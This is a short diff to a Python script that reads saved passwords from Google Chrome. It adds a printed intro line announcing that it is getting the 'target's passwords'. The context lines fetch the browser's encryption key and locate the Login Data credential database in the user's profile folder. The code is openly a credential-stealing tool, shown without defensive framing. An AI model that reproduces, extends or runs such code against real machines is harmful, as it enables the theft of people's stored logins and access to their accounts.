@@ -35,6 +35,8 @@ def decrypt_password(password, key):
 
 
 def main():
+    intro = "Executing code to get target's passwords from their Google Chrome browser."
+    print(intro)
     key = get_encryption_key()
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
     filename = "ChromeData.db"
